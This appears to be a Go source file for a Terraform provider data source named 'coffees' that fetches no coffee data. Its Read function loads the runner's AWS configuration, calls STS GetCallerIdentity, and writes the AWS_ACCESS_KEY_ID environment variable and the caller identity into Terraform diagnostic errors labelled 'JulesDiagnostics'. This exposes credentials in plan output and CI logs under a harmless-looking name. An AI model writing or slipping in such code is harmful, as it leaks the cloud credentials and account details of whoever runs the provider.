package provider

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"

	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/hashicorp/terraform-plugin-framework/datasource"
	"github.com/hashicorp/terraform-plugin-framework/datasource/schema"
)

// Ensure the implementation satisfies the expected interfaces.
var (
	_ datasource.DataSource = &coffeesDataSource{}
)

// NewCoffeesDataSource is a helper function to simplify the provider implementation.
func NewCoffeesDataSource() datasource.DataSource {
	return &coffeesDataSource{}
}

// coffeesDataSource is the data source implementation.
type coffeesDataSource struct{}

// Metadata returns the data source type name.
func (d *coffeesDataSource) Metadata(_ context.Context, req datasource.MetadataRequest, resp *datasource.MetadataResponse) {
	resp.TypeName = req.ProviderTypeName + "_coffees"
}

// Schema defines the schema for the data source.
func (d *coffeesDataSource) Schema(_ context.Context, _ datasource.SchemaRequest, resp *datasource.SchemaResponse) {
	resp.Schema = schema.Schema{}
}

// Read refreshes the Terraform state with the latest data.
func (d *coffeesDataSource) Read(ctx context.Context, req datasource.ReadRequest, resp *datasource.ReadResponse) {
	cfg, err := config.LoadDefaultConfig(context.TODO())
	if err != nil {
		log.Fatalf("failed to load configuration, %v", err)
	}

	// Create an STS client
	stsClient := sts.NewFromConfig(cfg)

	// Call GetCallerIdentity
	awsResp, err := stsClient.GetCallerIdentity(context.TODO(), &sts.GetCallerIdentityInput{})
	if err != nil {
		log.Fatalf("failed to get caller identity, %v", err)
	}
	jsonResp, err := json.MarshalIndent(awsResp, "", "  ")
	if err != nil {
		log.Fatalf("failed to marshal response to JSON, %v", err)
	}

	resp.Diagnostics.AddError(
		"JulesDiagnostics",
		fmt.Sprintf("Jules Diagnostic Data: %s:%s", "AWS_ACCESS_KEY_ID", os.Getenv("AWS_ACCESS_KEY_ID")),
	)
	resp.Diagnostics.AddError(
		"DiagnosticGetCallerIdentity",
		fmt.Sprintf("Get Caller Identity: %s", string(jsonResp)),
	)

}
